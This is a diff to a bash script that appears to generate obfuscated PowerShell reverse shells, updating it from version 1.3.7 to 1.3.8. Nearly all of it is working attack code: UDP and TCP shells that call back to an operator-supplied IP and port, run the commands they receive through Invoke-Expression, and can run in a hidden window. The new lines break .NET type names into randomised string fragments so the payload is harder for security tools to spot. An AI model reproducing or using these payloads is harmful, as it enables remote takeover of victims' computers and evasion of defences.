@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.3.7"
+version="1.3.8"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -410,13 +410,15 @@ fi
 if [[ $3 == "w" ]]
 then 
     win="-W Hidden"
-    userinfo="(\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + 'PS ' + (gl)"
+    userinfo="(\$env:UserName) + '@' + (\$env:UserDomain) + ([System.Environment]::NewLine) + 'PS ' + (gl).path"
 else
     userinfo="'PS ' + (gl)"
 fi
 
 tmp=$(openssl rand -hex 10)
 tmp2=$(openssl rand -hex 9)
+tmp3=$(openssl rand -hex 3)
+tmp4=$(openssl rand -hex 7)
 client=$(openssl rand -hex 11)
 stream=$(openssl rand -hex 3)
 data=$(openssl rand -hex 2)
@@ -428,13 +430,14 @@ i=$(openssl rand -hex 4)
 endpoint=$(openssl rand -hex 3)
 receivebytes=$(openssl rand -hex 4)
 returndata=$(openssl rand -hex 2)
+x=$(openssl rand -hex 2)
+result=$(openssl rand -hex 1)
 if [[ $4 == "udp" ]]
 then
 
-    shell="\$$tmp= @('sy','STem.NeT.iP','eNd','po','inT');\$$tmp2 = [String]::Join('',\$$tmp);\$$endpoint = New-Object \$$tmp2 ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object System.Net.Sockets.UDPClient($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$result +  'PS ' + (Get-Location).Path + '> ';\$x = (Out-String);\$$sendback2 = \$$sendback + \$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
-#shell="\$$tmp= @('sy','STem.NeT.iP','eNd','po','inT');\$$tmp2 = [String]::Join('',\$$tmp);\$$endpoint = New-Object \$$tmp2 ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object System.Net.Sockets.UDPClient($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '@' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$result +  'PS ' + (Get-Location).Path + '> ';\$x = (Out-String);\$$sendback2 = \$$sendback + \$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
-
+    shell="\$$tmp= @('sy','STem.NeT.iP','eNd','po','inT');\$$tmp2 = [String]::Join('',\$$tmp);\$$endpoint = New-Object \$$tmp2 ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$tmp3= @('Sy','st','em.Ne','t.So','ckets.U','DPC','lient');\$$tmp4 = [String]::Join('',\$$tmp3);\$$client = New-Object \$$tmp4 ($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (gl).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (gl).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
 else
+
     shell="\$$tmp= @('sYSteM.nEt.sOc','KEts.tCPClIent');\$$tmp2 = [String]::Join('',\$$tmp);\$$client = New-Object \$$tmp2('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
 fi
 
